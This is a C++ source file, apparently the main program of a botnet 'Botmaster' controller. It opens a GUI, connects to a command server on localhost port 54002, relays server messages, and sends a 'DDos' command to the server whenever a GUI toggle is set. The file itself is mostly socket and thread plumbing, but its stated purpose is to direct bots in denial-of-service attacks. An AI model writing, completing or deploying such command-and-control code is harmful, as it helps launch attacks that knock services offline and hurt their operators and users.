#include "BMpch.h"
#include "Client.h"

#include "Core/Base.h"
#include "GUI/src/GUI.h"

static std::mutex mutexMsg;
static std::condition_variable cvrcvMsg;
static std::atomic<bool> rcvMsg(false);

/*
static std::mutex mutexInput;
static std::condition_variable cvuserInput;
static std::string userInput;
static std::atomic<bool> userInputed(false);
*/

static std::atomic<bool> programClosed(false);

void waitingForServerMsg(Client& Botmaster)
{
	while (!programClosed.load())
	{
		std::unique_lock<std::mutex> ul(mutexMsg);
		rcvMsg = Botmaster.receiveFromServer();
		cvrcvMsg.wait(ul, []() { return !rcvMsg.load(); });
	}
}

/*
void waitingForUserInput()
{
	while (!programClosed.load())
	{
		std::unique_lock<std::mutex> ul(mutexInput);
		std::getline(std::cin, userInput);
		userInputed = true;
		cvuserInput.wait(ul, []() { return !userInputed.load(); });
	}
}
*/

int main()
{

	Log::Init();
	GUI::GUI gui(1920, 1080, "Botmaster");
	gui.Init();
	Client Botmaster;

	BM_LOG_INFO("Init Botmaster");
	
	if (!Botmaster.init())
		return 0;

	if (Botmaster.createSocket())
	{
		if (Botmaster.connectToSrv("127.0.0.1", 54002))
		{
			BM_LOG_INFO("Connected");
			std::thread worker1(waitingForServerMsg, std::ref(Botmaster));
			//std::thread worker2(waitingForUserInput);
			//worker2.detach();

			while (gui.IsRunning())
			{
				/*if (userInputed.load())
				{
					if (userInput == "exit")
						break;
					Botmaster.sendToSrv(userInput.c_str(), userInput.size());
					userInputed = false;
					cvuserInput.notify_one();
				}*/
				if(gui.GetGuiLayer()->DDoS)
					Botmaster.sendToSrv("DDos", 5);

				if (rcvMsg.load())
				{
					std::cout << Botmaster.getSrvMsg() << std::endl;
					rcvMsg = false;
					cvrcvMsg.notify_one();
				}
			}
			Botmaster.closeConnection1();
			programClosed = true;
			worker1.join();
			Botmaster.closeConnection2();
		}
		else
		{
			BM_LOG_INFO("Couldnt connect to srv");
		}
	}
	else
	{
		BM_LOG_INFO("Couldnt create Socket");
	}
	return 0;
}